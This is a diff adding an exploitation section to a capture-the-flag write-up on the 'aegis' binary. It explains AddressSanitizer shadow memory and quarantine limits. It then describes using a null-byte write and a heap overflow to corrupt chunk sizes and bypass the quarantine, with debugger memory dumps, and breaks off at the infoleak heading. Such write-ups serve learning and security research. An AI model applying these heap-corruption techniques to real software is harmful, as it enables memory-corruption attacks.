@@ -73,7 +73,6 @@ So it frees the pointer, however it doesn't clear out the pointer so we can stil
 
 ##### Show Note
 
-
 ```
   ((void (__fastcall *)(const char *))printf)("Index: ");
   index = read_int();
@@ -238,6 +237,97 @@ gef➤  x/x $rax+0x7fff8000
 
 Here we can see that the byte is being checked has been set to `0xfd`. It will fail the check here and the program will stop running.
 
+We can see that in the assembly code, that it maps the shadow memory to normal memory by taking the normal address and running it through the equation `((address >> 3) + 0x7fff8000) = shadow_address`.
+
 ### Exploitation
 
-So we have three bugs. A Use After Free with the delete function, a null byte write with the secret function, and an 8 byte heap overflow with the update function.
+So we have three bugs. A Use After Free with the delete function, a null byte write with the secret function, and an heap overflow with the update function.
+
+However to use the Use After Free, we will have to deal with an aspect of Address Sanitization first. The thing is with ASAN, it will try to not reuse freed memory until a certain amount has already been freed. The reason for this is it is designed to find memory corruption bugs instead of being efficient(like Use After Frees), so it will do this to hopefully find more bugs. So we will have to free a certain amount of memory before we can use the use after free. We can find out how much memory we need to free to cause freed memory to be reallocated like this:
+
+```
+$	export ASAN_OPTIONS=verbosity=1
+$	./aegis 
+==20689==AddressSanitizer: libc interceptors initialized
+|| `[0x10007fff8000, 0x7fffffffffff]` || HighMem    ||
+|| `[0x02008fff7000, 0x10007fff7fff]` || HighShadow ||
+|| `[0x00008fff7000, 0x02008fff6fff]` || ShadowGap  ||
+|| `[0x00007fff8000, 0x00008fff6fff]` || LowShadow  ||
+|| `[0x000000000000, 0x00007fff7fff]` || LowMem     ||
+MemToShadow(shadow): 0x00008fff7000 0x000091ff6dff 0x004091ff6e00 0x02008fff6fff
+redzone=16
+max_redzone=2048
+quarantine_size_mb=256M
+thread_local_quarantine_size_kb=1024K
+malloc_context_size=30
+SHADOW_SCALE: 3
+SHADOW_GRANULARITY: 8
+SHADOW_OFFSET: 0x7fff8000
+==20689==Installed the sigaction for signal 11
+==20689==Installed the sigaction for signal 7
+==20689==Installed the sigaction for signal 8
+==20689==T0: stack [0x7ffd2f036000,0x7ffd2f836000) size 0x800000; local=0x7ffd2f833b58
+==20689==AddressSanitizer Init done
+  ___   ____ _____ _____ _______ ____ _____ _____   ____   ___  _  ___  
+ / _ \ / ___|_   _|  ___/ /_   _/ ___|_   _|  ___| |___ \ / _ \/ |/ _ \ 
+| | | | |     | | | |_ / /  | || |     | | | |_      __) | | | | | (_) |
+| |_| | |___  | | |  _/ /   | || |___  | | |  _|    / __/| |_| | |\__, |
+ \___/ \____| |_| |_|/_/    |_| \____| |_| |_|     |_____|\___/|_|  /_/
+```
+
+We can see that we need to free `256` megabytes (the value of `quarantine_size_mb`). Now since we can't allocate that much memory in the code, we will need to jump through some hoops to do this. What we can do is overwrite the size of a chunk in it's header to be something like `0xffffffff`. Then when it frees the chunk with the overflowed memory, then it will have surpassed the `quarantine_size_mb` limit and we will be able to allocate freed chunks.
+
+#### Header Overflow
+
+Now for figuring out how to overwrite the header. First let's take a look at a chunk (keep in mind that with address sanitization it uses a custom malloc, so it's a bit different). This chunk is what we get when we allocate a `0x10` byte chunk with the contents `000000000` and id `0xffffffffffffffff`:
+
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x2ffffff00000002	0x1e80000120000010
+0x602000000010:	0x30303030303030	0xffffffffffffffff
+0x602000000020:	0x2ffffff00000002	0x7180000120000010
+0x602000000030:	0x602000000010	0x563d6b2a4ab0
+```
+
+So we can see here that this chunk is really two seperate chunks. The data section of the first chunk (`0x602000000010`-`0x602000000020`) contains the eight bytes of the contents and the eight byte ID. The data section fo the second chunk (`0x602000000030`-`0x602000000040`) contains an eight byte pointer to the first data section, and an eight byte instruction pointer which is executed when asan detects a bug.
+
+There are two headers between `0x602000000000`-`0x602000000010` and `0x602000000020`-`0x602000000030`. The headers in this time contain the same data values. For the particular values in the heap header, the only one we need to really worry about what it represents is the size value. Through trial and error we see that the lower bytes of the second eight byte segment represents the size. In addition to that we see that if we allocate a chunk of the same size as the second one (`0x10`) the two chunks line up for our overflow. Also to not disturb the chunk header values there too much, we will just overwrite most of the header values with their initial values (except for the size which we will overwrite with `0xffffffff`).
+
+However before we do the overflow, we will need to use the secret function to mark the area of memory we're writing to to be writeable for ASAN. Now we can only mark eight bytes as writeable with our one null byte write. The value we need to write to is at `0x602000000028`, however we need to write to `0x602000000020` as part of the overflow. However what we can do is do a partial overflow into the eight byte segment at `0x602000000020`. Then we do a second overflow where the size gets written before `0x602000000028`, however it will still overflow the size value at `0x602000000028`. This way we can do the overwrite with just marking the `0x602000000020` address as writeable. 
+
+Since with ASAN doesn't have aslr in the heap, we can know heap addresses before the binary ever runs. Looking at how ASAN maps shadow memory to normal memory, the address we will pass the secret function will be ((0x602000000020 >> 3) + 0x7fff8000).
+
+Now let's go over the overflow. First we will create the chunk of size `0x10`:
+
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x02ffffff00000002	0x2080000220000010
+0x602000000010:	0xff30303030303030	0xbeffffffffffffff
+0x602000000020:	0x02ffffff00000002	0x7180000120000010
+0x602000000030:	0x0000602000000010	0x0000563016b9fab0
+```
+
+Then we will overflow the second chunk. We will insert a null byte at `0x602000000024`, that way with our next overflow the ID will be able to overwrite the size value to what we want (although with this ID, we were able to overwrite the size with a `0x15`):
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x02ffffff00000002	0x2080000220000010
+0x602000000010:	0x0202020202020202	0x0202020202020202
+0x602000000020:	0x02ffff0002020202	0x7180000120000015
+0x602000000030:	0x0000602000000010	0x0000563016b9fab0
+```
+
+Now that everything is set up, we can overflow the size to be `0xffffffff`:
+
+```
+gef➤  x/40g 0x0000602000000000
+0x602000000000:	0x02ffffff00000002	0x2080000220000010
+0x602000000010:	0x0202020202020202	0x0202020202020202
+0x602000000020:	0x02ffffff02020202	0x71800001ffffffff
+0x602000000030:	0x0000602000000010	0x0000563016b9fab0
+```
+
+After that, we can just free that chunk and we will be able reallocate previously used chunks.
+
+### Infoleak
+
+Now that we can 
